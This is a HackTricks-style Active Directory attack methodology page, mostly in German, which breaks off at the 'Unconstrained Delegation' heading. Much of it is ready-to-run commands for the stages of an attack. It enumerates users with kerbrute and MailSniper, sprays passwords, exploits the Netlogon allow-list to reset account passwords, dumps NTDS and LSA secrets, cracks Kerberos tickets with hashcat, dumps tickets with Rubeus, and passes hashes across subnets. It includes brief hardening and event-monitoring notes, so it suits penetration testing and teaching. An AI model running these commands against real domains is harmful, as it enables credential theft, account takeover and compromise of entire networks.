# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** dient als grundlegende Technologie und ermöglicht es **network administrators**, **domains**, **users** und **objects** innerhalb eines Netzwerks effizient zu erstellen und zu verwalten. Es ist auf Skalierbarkeit ausgelegt und erleichtert die Organisation einer großen Anzahl von Benutzern in verwaltbare **groups** und **subgroups**, während **access rights** auf verschiedenen Ebenen gesteuert werden.

Die Struktur von **Active Directory** besteht aus drei primären Ebenen: **domains**, **trees** und **forests**. Eine **domain** umfasst eine Sammlung von Objekten, wie z. B. **users** oder **devices**, die eine gemeinsame Datenbank teilen. **Trees** sind Gruppen dieser Domains, die durch eine gemeinsame Struktur verbunden sind, und ein **forest** stellt die Sammlung mehrerer Trees dar, die über **trust relationships** miteinander verbunden sind und die oberste Ebene der Organisationsstruktur bilden. Auf jeder dieser Ebenen können spezifische **access**- und **communication rights** festgelegt werden.

Zu den Kernkonzepten in **Active Directory** gehören:

1. **Directory** – Enthält alle Informationen zu Active-Directory-Objekten.
2. **Object** – Bezeichnet Entitäten im Directory, einschließlich **users**, **groups** oder **shared folders**.
3. **Domain** – Dient als Container für Directory-Objekte, wobei mehrere Domains innerhalb eines **forest** koexistieren können und jede ihre eigene Objektsammlug verwaltet.
4. **Tree** – Eine Gruppierung von Domains, die eine gemeinsame Root-Domain teilen.
5. **Forest** – Der Höhepunkt der Organisationsstruktur in Active Directory, bestehend aus mehreren Trees mit **trust relationships** untereinander.

**Active Directory Domain Services (AD DS)** umfasst eine Reihe von Diensten, die für die zentrale Verwaltung und Kommunikation innerhalb eines Netzwerks entscheidend sind. Diese Dienste umfassen:

1. **Domain Services** – Zentralisiert die Datenspeicherung und verwaltet Interaktionen zwischen **users** und **domains**, einschließlich **authentication**- und **search**-Funktionalität.
2. **Certificate Services** – Überwacht die Erstellung, Verteilung und Verwaltung sicherer **digital certificates**.
3. **Lightweight Directory Services** – Unterstützt directory-fähige Anwendungen über das **LDAP protocol**.
4. **Directory Federation Services** – Bietet **single-sign-on**-Funktionen, um Benutzer über mehrere Webanwendungen in einer einzigen Sitzung zu authentifizieren.
5. **Rights Management** – Hilft, urheberrechtlich geschütztes Material zu sichern, indem dessen unbefugte Verteilung und Nutzung geregelt wird.
6. **DNS Service** – Entscheidend für die Auflösung von **domain names**.

Für eine detailliertere Erklärung siehe: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Um zu lernen, wie man **attack an AD** kann, musst du den **Kerberos authentication process** wirklich gut **understand**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Du kannst viel auf [https://wadcoms.github.io/](https://wadcoms.github.io) nachschlagen, um schnell zu sehen, welche Commands du ausführen kannst, um ein AD zu enumerieren/exploiten.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Wenn du nur Zugriff auf eine AD-Umgebung hast, aber keine Credentials/Sessions, könntest du:

- **Pentest the network:**
- Scanne das Netzwerk, finde Maschinen und offene Ports und versuche, **vulnerabilities zu exploitieren** oder **credentials daraus zu extrahieren** (zum Beispiel können [printers sehr interessante Ziele sein](ad-information-in-printers.md).
- Die DNS-Enumerierung kann Informationen über wichtige Server in der Domain liefern, z. B. Web, printers, shares, vpn, media usw.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Sieh dir die allgemeine [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) an, um mehr Informationen dazu zu finden, wie man das macht.
- **Check for null and Guest access on smb services** (das funktioniert auf modernen Windows-Versionen nicht):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Eine detailliertere Anleitung zur Enumerierung eines SMB-Servers findest du hier:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Eine detailliertere Anleitung zur Enumerierung von LDAP findest du hier (achte **besonders auf den anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Sammle Credentials durch [**Impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Greife auf Hosts zu, indem du den [**relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) missbrauchst
- Sammle Credentials, indem du [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) exponierst
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrahiere Benutzernamen/Namen aus internen Dokumenten, sozialen Medien und Diensten (hauptsächlich web) innerhalb der Domain-Umgebung und auch aus öffentlich verfügbaren Quellen.
- Wenn du die vollständigen Namen von Firmenmitarbeitern findest, kannst du verschiedene AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)) ausprobieren. Die häufigsten Konventionen sind: _NameSurname_, _Name.Surname_, _NamSur_ (3 Buchstaben von jedem), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _zufällige Buchstaben und 3 zufällige Zahlen_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Sieh dir die Seiten [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) und [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) an.
- **Kerbrute enum**: Wenn ein **invalid username** angefragt wird, antwortet der Server mit dem **Kerberos error**-Code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wodurch wir feststellen können, dass der Username ungültig war. **Valid usernames** lösen entweder die **TGT in a AS-REP**-Antwort oder den Fehler _KRB5KDC_ERR_PREAUTH_REQUIRED_ aus, was darauf hinweist, dass der Benutzer eine Pre-Authentication durchführen muss.
- **No Authentication against MS-NRPC**: Nutzung von auth-level = 1 (No authentication) gegen die MS-NRPC (Netlogon)-Schnittstelle auf Domain Controllern. Die Methode ruft die `DsrGetDcNameEx2`-Funktion auf, nachdem die MS-NRPC-Schnittstelle gebunden wurde, um ohne Credentials zu prüfen, ob der Benutzer oder Computer existiert. Das Tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementiert diese Art der Enumeration. Die Forschung findest du [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Wenn du einen dieser Server im Netzwerk gefunden hast, kannst du auch **user enumeration** dagegen durchführen. Zum Beispiel könntest du das Tool [**MailSniper**](https://github.com/dafthack/MailSniper) verwenden:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Even after **Zerologon** is patched on the DC, explicitly allow-listed accounts can still be exposed to **legacy/vulnerable Netlogon secure-channel behavior**. The risky configuration is the GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** or the matching registry value **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

That value is an **SDDL security descriptor** (see [Security Descriptors](security-descriptors.md)). Any account or group granted the relevant ACE in the DACL can be targeted. For example, `O:BAG:BAD:(A;;RC;;;WD)` effectively allow-lists **Everyone**.

Practical operator workflow:

1. **Identify allow-listed principals** by checking both **SYSVOL/GPO** and the **live DC registry**.
2. **Resolve SIDs** found in the SDDL to real AD users/computers and prioritize **DC machine accounts**, **trust accounts**, and other privileged machines.
3. Repeatedly attempt **MS-NRPC / Netlogon authentication** as the allow-listed account.
4. After a successful guess, abuse **Netlogon password-setting** to reset the target account password (the public PoC sets it to an empty string).

Quick triage / lab examples from the public artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notizen:

- Der **scanner** ist nützlich, weil die effektive Allow-List in **SYSVOL**, in der **registry** oder in beiden existieren kann.
- Der Exploit-Pfad selbst ist wichtig, weil er **keine Domain Admin privileges erfordert**, sobald ein verwundbares Konto identifiziert wurde.
- Das Kompromittieren eines **Domain Controller machine account** wie `DC$` ist besonders gefährlich, weil das Zurücksetzen dieses Passworts direkt breitere **AD takeover**-Pfade ermöglichen kann.
- Die **Brute-force feasibility** hängt vom Modus ab: Das öffentliche Artefakt beschreibt einen meet-in-the-middle-Ansatz, einen **24-bit** brute force, wenn ein anderes computer account verfügbar ist, und langsamere **32-bit**-Varianten.

Detection / hardening notes:

- Überprüfe die Allow-List policy und entferne alles außer temporären, ausdrücklich erforderlichen compatibility exceptions.
- Überwache DC **System**-Events **5827/5828/5829/5830/5831**, um verworfene, entdeckte oder durch policy ausdrücklich erlaubte vulnerable Netlogon connections zu erkennen.
- Behandle Konten in `VulnerableChannelAllowList` als **high-risk**, bis die legacy dependency entfernt ist.

### Knowing one or several usernames

Ok, also du weißt bereits, dass du einen gültigen username hast, aber keine passwords... Dann versuche:

- [**ASREPRoast**](asreproast.md): Wenn ein user das Attribut _DONT_REQ_PREAUTH_ **nicht hat**, kannst du eine **AS_REP message anfordern** für diesen user, die einige durch eine Ableitung des password des users verschlüsselte Daten enthält.
- [**Password Spraying**](password-spraying.md): Lass uns die **häufigsten passwords** mit jedem der entdeckten users ausprobieren, vielleicht verwendet irgendein user ein schwaches password (denk an die password policy!).
- Beachte, dass du auch **OWA servers sprayen** kannst, um Zugriff auf die Mail servers der users zu erhalten.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Möglicherweise kannst du einige challenge **hashes** **erhalten**, um einige Protokolle des **network** zu **poisonen**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Wenn es dir gelungen ist, das active directory zu enumerieren, wirst du **mehr emails und ein besseres Verständnis des network** haben. Möglicherweise kannst du NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) erzwingen, um Zugriff auf die AD env zu erhalten.

### NetExec workspace-driven recon & relay posture checks

- Verwende **`nxcdb` workspaces**, um den AD recon-Status pro Engagement zu verwalten: `workspace create <name>` erstellt per-protocol SQLite DBs unter `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Wechsle die Ansicht mit `proto smb|mssql|winrm` und liste gesammelte secrets mit `creds` auf. Lösche sensible Daten manuell, wenn du fertig bist: `rm -rf ~/.nxc/workspaces/<name>`.
- Schnelle subnet discovery mit **`netexec smb <cidr>`** zeigt **domain**, **OS build**, **SMB signing requirements** und **Null Auth**. Mitglieder mit `(signing:False)` sind **relay-prone**, während DCs oft signing verlangen.
- Erzeuge **hostnames in /etc/hosts** direkt aus der NetExec-Ausgabe, um das Targeting zu erleichtern:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wenn **SMB relay zum DC blockiert** ist durch Signing, prüfe trotzdem die **LDAP**-Konfiguration: `netexec ldap <dc>` hebt `(signing:None)` / schwache Channel Binding hervor. Ein DC mit erforderlichem SMB Signing, aber deaktiviertem LDAP Signing, bleibt ein brauchbares **relay-to-LDAP**-Ziel für Missbrauch wie **SPN-less RBCD**.

### Client-seitige Printer-Credential-Leaks → Bulk Domain Credential Validation

- Printer-/Web-UIs **betten manchmal maskierte Admin-Passwörter in HTML ein**. Im Source/Devtools ansehen kann Klartext offenlegen (z. B. `<input value="<password>">`), wodurch Basic-auth-Zugriff auf Scan-/Print-Repositories möglich wird.
- Abgerufene Print-Jobs können **plaintext Onboarding-Dokumente** mit passworten pro Benutzer enthalten. Halte beim Testen die Zuordnungen konsistent:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

Für diesen Schritt musst du die **Credentials oder eine Session eines gültigen Domain-Accounts kompromittiert** haben. Wenn du gültige Credentials oder eine Shell als Domain-User hast, **solltest du dir merken, dass die zuvor genannten Optionen weiterhin Optionen sind, um andere User zu kompromittieren**.

Bevor du mit der authentifizierten Enumeration beginnst, solltest du das **Kerberos double hop problem** kennen.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Einen Account kompromittiert zu haben ist ein **großer Schritt, um die gesamte Domain zu kompromittieren**, weil du dann mit der **Active Directory Enumeration** beginnen kannst:

Bezüglich [**ASREPRoast**](asreproast.md) kannst du jetzt jeden möglichen verwundbaren User finden, und bezüglich [**Password Spraying**](password-spraying.md) kannst du eine **Liste aller Usernamen** erhalten und das Passwort des kompromittierten Accounts, leere Passwörter und neue vielversprechende Passwörter ausprobieren.

- Du kannst [**CMD für eine grundlegende Recon**](../basic-cmd-for-pentesters.md#domain-info) verwenden
- Du kannst auch [**powershell für recon**](../basic-powershell-for-pentesters/index.html) verwenden, was unauffälliger ist
- Du kannst auch [**powerview verwenden**](../basic-powershell-for-pentesters/powerview.md), um detailliertere Informationen zu extrahieren
- Ein weiteres großartiges Tool für recon in einer active directory ist [**BloodHound**](bloodhound.md). Es ist **nicht sehr stealthy** (abhängig von den Collection-Methoden, die du verwendest), aber **wenn dir das egal ist**, solltest du es definitiv ausprobieren. Finde heraus, wo sich Users per RDP anmelden können, finde Pfade zu anderen Gruppen usw.
- **Weitere automatisierte AD enumeration tools sind:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records der AD**](ad-dns-records.md), da sie interessante Informationen enthalten können.
- Ein **Tool mit GUI**, das du zur Enumeration des directory verwenden kannst, ist **AdExplorer.exe** aus der **SysInternal** Suite.
- Du kannst auch in der LDAP database mit **ldapsearch** nach Credentials in den Feldern _userPassword_ & _unixUserPassword_ oder sogar _Description_ suchen. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) für andere Methoden.
- Wenn du **Linux** verwendest, kannst du die Domain auch mit [**pywerview**](https://github.com/the-useless-one/pywerview) enumerieren.
- Du könntest auch automatisierte Tools wie diese ausprobieren:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Alle Domain-User extrahieren**

Es ist sehr einfach, alle Domain-Usernamen aus Windows zu erhalten (`net user /domain` ,`Get-DomainUser` oder `wmic useraccount get name,sid`). In Linux kannst du Folgendes verwenden: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oder `enum4linux -a -u "user" -p "password" <DC IP>`

> Auch wenn dieser Enumeration-Abschnitt klein aussieht, ist er der wichtigste von allen. Öffne die Links (hauptsächlich die zu cmd, powershell, powerview und BloodHound), lerne, wie man eine Domain enumeriert, und übe, bis du dich sicher fühlst. Während eines Assessments wird das der Schlüsselmoment sein, um deinen Weg zu DA zu finden oder festzustellen, dass nichts getan werden kann.

### Kerberoast

Kerberoasting bedeutet, **TGS tickets** zu erhalten, die von Services verwendet werden, die an User-Accounts gebunden sind, und deren Verschlüsselung offline zu cracken — sie basiert auf den Passwörtern der User.

Mehr dazu hier:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Sobald du einige Credentials erhalten hast, kannst du prüfen, ob du auf irgendeine **machine** zugreifen kannst. Dafür kannst du **CrackMapExec** verwenden, um je nach deinen Port-Scans Verbindungen zu mehreren Servern mit unterschiedlichen Protokollen zu versuchen.

### Local Privilege Escalation

Wenn du Credentials oder eine Session als regulärer Domain-User kompromittiert hast und mit diesem User **Zugriff** auf **irgendeine machine in der Domain** hast, solltest du versuchen, lokal zu **privilege escalaten und Credentials zu looten**. Das liegt daran, dass du nur mit lokalen Administratorrechten in der Lage sein wirst, **Hashes anderer User** im Speicher (LSASS) und lokal (SAM) zu **dumpen**.

Es gibt in diesem Buch eine vollständige Seite über [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) und eine [**checklist**](../checklist-windows-privilege-escalation.md). Außerdem solltest du nicht vergessen, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) zu verwenden.

### Current Session Tickets

Es ist sehr **unwahrscheinlich**, dass du **tickets** im aktuellen User finden wirst, die dir die **Berechtigung geben, auf** unerwartete Ressourcen zuzugreifen, aber du kannst nachsehen:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Wenn du es geschafft hast, das Active Directory zu enumerieren, wirst du **mehr E-Mails und ein besseres Verständnis des Netzwerks** haben. Möglicherweise kannst du NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)** erzwingen.**

### Looks for Creds in Computer Shares | SMB Shares

Jetzt, da du einige grundlegende Credentials hast, solltest du prüfen, ob du **irgendwelche interessanten Dateien finden** kannst, die innerhalb des AD geteilt werden. Du könntest das manuell machen, aber es ist eine sehr langweilige, sich wiederholende Aufgabe (und noch mehr, wenn du Hunderte von Dokumenten findest, die du prüfen musst).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Wenn du auf andere PCs oder Shares **zugreifen kannst**, könntest du **Dateien platzieren** (wie eine SCF-Datei), die, wenn sie irgendwie aufgerufen werden, eine NTLM-Authentifizierung gegen dich **auslösen** sodass du den **NTLM challenge** stehlen und knacken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Diese Schwachstelle erlaubte jedem authentifizierten Benutzer, den **Domain Controller zu kompromittieren**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Für die folgenden Techniken reicht ein normaler Domain-User nicht aus, du brauchst einige spezielle Privilegien/Credentials, um diese Angriffe durchzuführen.**

### Hash extraction

Hoffentlich hast du es geschafft, ein **lokales Admin-Konto** mit [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) inklusive relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [lokaler Rechteausweitung](../windows-local-privilege-escalation/index.html) zu kompromittieren.\
Dann ist es an der Zeit, alle Hashes im Speicher und lokal zu dumpen.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sobald du den Hash eines Benutzers hast**, kannst du ihn verwenden, um **seine Identität vorzutäuschen**.\
Du musst ein **Tool** verwenden, das die **NTLM-Authentifizierung mit** diesem **Hash** **durchführt**, **oder** du könntest eine neue **sessionlogon** erstellen und diesen **Hash** in die **LSASS** **injizieren**, sodass bei jeder **NTLM-Authentifizierung** dieser **Hash verwendet wird**. Die letzte Option ist das, was mimikatz macht.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Dieser Angriff zielt darauf ab, den **NTLM-Hash des Benutzers zu verwenden, um Kerberos-Tickets anzufordern**, als Alternative zum üblichen Pass The Hash über das NTLM-Protokoll. Daher kann dies besonders **nützlich in Netzwerken sein, in denen das NTLM-Protokoll deaktiviert ist** und nur **Kerberos als Authentifizierungsprotokoll erlaubt** ist.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Bei der Angriffsmethode **Pass The Ticket (PTT)** **stehlen Angreifer das Authentifizierungs-Ticket eines Benutzers** statt seines Passworts oder seiner Hash-Werte. Dieses gestohlene Ticket wird dann verwendet, um **die Identität des Benutzers vorzutäuschen** und unautorisierten Zugriff auf Ressourcen und Dienste innerhalb eines Netzwerks zu erhalten.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Wenn du den **Hash** oder das **Passwort** eines **lokalen Administrators** hast, solltest du versuchen, dich damit **lokal auf anderen PCs anzumelden**.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Beachte, dass dies ziemlich **noisy** ist und **LAPS** es **mitigieren** würde.

### MSSQL Abuse & Trusted Links

Wenn ein Benutzer Berechtigungen hat, um auf **MSSQL instances** zu **zugreifen**, könnte er sie nutzen, um **commands auszuführen** auf dem MSSQL-Host (wenn er als SA läuft), den NetNTLM-**hash** zu **stehlen** oder sogar einen **relay**-**attack** durchzuführen.\
Außerdem, wenn eine MSSQL-Instanz von einer anderen MSSQL-Instanz **trusted** ist (database link). Wenn der Benutzer Berechtigungen über die vertrauenswürdige Datenbank hat, kann er die **trust relationship verwenden, um queries auch in der anderen Instanz auszuführen**. Diese trusts können verkettet werden, und irgendwann kann der Benutzer möglicherweise eine falsch konfigurierte Datenbank finden, auf der er commands ausführen kann.\
**Die Links zwischen Datenbanken funktionieren sogar über forest trusts hinweg.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Drittanbieter-Inventory- und Deployment-Suites öffnen oft mächtige Wege zu credentials und code execution. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

